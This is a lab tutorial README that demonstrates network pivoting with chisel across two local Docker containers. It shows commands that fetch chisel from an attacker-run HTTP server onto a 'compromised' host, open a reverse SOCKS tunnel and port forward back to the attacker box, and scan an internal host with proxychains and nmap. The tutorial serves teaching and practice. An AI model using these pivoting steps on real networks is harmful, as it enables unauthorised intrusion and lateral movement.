# Playing with chisel
A small repo with examples to play with chisel

---

# Requirements:

- A Linux system/Attacker Box (I will use Manjaro)
- 2 Linux Docker Containers (I will use 2 Ubuntu containers)

---

# On our Attacker Box:

We will download <code>chisel</code> from the github repo:

```
https://github.com/jpillora/chisel
```

I will version <code>v1.7.7</code>

![](./Images/Version.png)

<i>NOTE:</i> If we attack a Windows system the Windows and Linux chisel must be on the same version e.g: 1.7.7

We install:

```bash
sudo packman -Sy proxychains
```

---

# On the Victim Containers

```bash
docker run -ti -h external ubuntu
docker run -ti -h internal ubuntu
```

The container named `external` is the one that we will use as a pivot to access the `internal` container

![](./Images/Containers0.png)

On the 2 containers we run:

```bash
apt update
apt install wget
apt install net-tools
pat install python3
```

![](./Images/Containers1.png)

![](./Images/Containers2.png)

---

# POC:

The `external` machine has the IP address: `172.17.0.3`

![](./Images/Containers3.png)


The `internal` machine has the IP address: `172.17.0.2`

![](./Images/Containers4.png)

On the `internal` machine we start a `Simple Python HTTP Server on TCP Port 8080`

```bash
python3 -m http.server 8080
```

![](./Images/Containers5.png)

We will try to access the HTTP server on the `internal` machine with a `curl` from out `Attacker Box` with the IP of `external`.

On the `external` machine we transfer `chisel`:

```bash
wget 192.168.1.36:8081/chisel
```

<i>NOTE:</i> The system with IP address `192.168.1.36` is my Manjaro Box wich runs an HTTP server on TCP Port 8081 to transfer files.

![](./Images/Containers6.png)

On our `Attacker Box` we run `chisel` as a server on port 8000 in `reverse mode` for reverse port forwarding

```bash
./chisel server -p 8000 --reverse
```

![](./Images/Host0.png)

On the 'compromised' `external` machine we run the `chisel` client and use a socks proxy:

```bash
./chisel client 192.168.1.36:8000 R:socks
```

![](./Images/Containers7.png)

![](./Images/Containers8.png)

The default socks port is the TCP Port 1080.

On our Attacker Box we have configure `proxychains` to use the socks5 proxy on TCP Port 1080:

```bash
sudo nvim /etc/proxychains.conf
```

![](./Images/ProxyChains0.png)

We add the last line:

```
socks5 127.0.0.1 1080
```

Now we can use `proxychains` before any command in order to pass the traffic from the pivot machine (`external`)

On our `Attacker Box`:

```bash
proxychains curl 172.17.0.2:8080
```

![](./Images/Host1.png)

As we can see there is a GET request on the TCP Port 8080 on the `internal` machine which came from the pivot(`external`) machine:

![](./Images/Containers9.png)

---

# Scanning with proxychains:

On our Attacker Box:

```bash
proxychains nmap -Pn -sV -sC  172.17.0.2
```

![](./Images/Host2.png)

---

# Material:

```
https://www.youtube.com/watch?v=dIqoULXmhXg
```

---

# Reverse Individual Port Forwarding:

Using our setup with the 2 containers we will start a server on the external machine and make it so the server will only listen to 127.0.0.1

On the `external` machine we use the following command to start an HTTP server on TCP Port 8000 that only listens on `127.0.0.1`

```bash
python -m http.server 8000 --bind 127.0.0.1
```

![](./Images/RevPortForw0.png)

By scanning the victim machine we notice that no service is available via the `172.17.0.2` IP.

![](./Images/RevPortForw1.png)

We now have to set up our `chisel server` that listens on TCP Port 6969.

Attacker:

```bash
~/Downloads/chisel server -p 6969 --reverse
```

![](./Images/RevPortForw2.png)

Victim:

```bash
./chisel client 192.168.1.36:6969 R:8001:127.0.0.1:8000
```

The Victim asks the Attacker box to open TCP Port `8001` and forward the Victim's TCP Port `8000`.

By Scanning my `manjaro`(Attacker Box) TCP Port 8001 I access the HTTP service running on the container.

![](./Images/RevPortForw3.png)

<br>

![](./Images/RevPortForw4.png)

# Material:

```
https://notes.benheater.com/books/network-pivoting/page/port-forwarding-with-chisel
https://stackoverflow.com/questions/12268835/is-it-possible-to-run-python-simplehttpserver-on-localhost-only
```
